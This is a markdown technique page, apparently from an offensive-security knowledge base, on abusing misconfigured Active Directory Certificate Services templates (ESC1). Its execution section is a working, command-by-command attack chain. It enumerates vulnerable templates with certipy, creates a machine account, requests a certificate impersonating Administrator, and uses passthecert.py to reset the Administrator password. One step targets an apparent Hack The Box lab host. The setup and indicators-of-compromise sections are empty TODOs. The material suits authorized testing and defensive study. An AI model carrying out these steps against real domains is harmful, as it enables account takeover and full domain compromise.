# Certificate Template Abuse
## Summary

Certificate Template Abuse is a technique that can be used to impersonate/take control of any user in a domain given a misconfiguration in certificate templates in the Active Directory Certificate Services (ADCS). To learn more about this technique, please visit [this excellent blog post.](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

## Prerequisites

Active Directory with ADCS set up and configured. A certificate template must be created where the enrollee can specify the Subject Alternative Name (SAN), and can authenticate via the template. Further, a non-privileged account or group must be able to enroll into the template and the attacker must have control over that account or group.

## Setup

TODO

## Execution

### Method 1 - ESC1

The first step is to determine if any certificate template is vulnerable. Using the [certipy](https://github.com/ly4k/Certipy) utility, run the following command to query the ADCS service:

```bash
certipy find -u username -p password -dc-ip <ip>
```

The command should product a txt and json file. Use the `jq` command below to trim out irrelevant details:

```bash
jq '."Certificate Templates" | .[] | select(.Enabled == true) | select(."[!] Vulnerabilities" != null) | {"Template Name", "Client Authentication", "Any Purpose", "Enrollee Supplies Subject", "Permissions", "[!] Vulnerabilities"}' <certipy_output>.json
```

![JQ Output](./images/Pasted%20image%2020230718150901.png)

In this case, the "CorpVPN" template can be used in this exploit. It's important to take note of the CA used in the template, underneath the "Certificate Authorities" block.

In this example, the "Domain Computers" group is able to enroll a certificate. If the user under our control has the ability to create a user account, the following command can be used:

```bash
addcomputer.py -dc-ip <ip> -computer-pass 'Password123' -computer-name 'ComputerName' 'domain.com/username:password' -computer
-group 'CN=Domain Computers,DC=domain,DC=com'
```

![addcomputer.py](./images/Pasted%20image%2020230718145531.png)

Now, using the computer account that was just created, the following certipy command will attempt to abuse the misconfiguration and will return the certifcate and key in a pfx file for the Administrator account:

```bash
certipy req -u 'ComputerName$' -p 'Password123' -dc-ip <ip> -ca '<ASSIGNED-CA>' -template 'CorpVPN' -upn 'Administrator'
```

If the command times out, repeat several times until the output resembles the following:

![pfx file](./images/Pasted%20image%2020230718145653.png)

Some tools may not be able to handle the pfx file, so the following certipy commands will break it into the certificate and key files:

```bash
certipy cert -pfx administrator.pfx -nokey -out administrator.crt
certipy cert -pfx administrator.pfx -nocert -out administrator.key
```

Finally, using [this github repo](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python),  download the "passthecert.py" file to utilize the certificate and key to change the Administrators password:

```bash
passthecert.py -action modify_user -target administrator -new-pass 'Pwned!!' -domain 'authority.htb' -dc-ip 10.129.250.8 -crt administrator.crt -key administrator.key
```

![passthecert](./images/Pasted%20image%2020230718150333.png)

At this point the Administrator users password should be changed to "Pwned!!".

#### Indicators of Compromise

TODO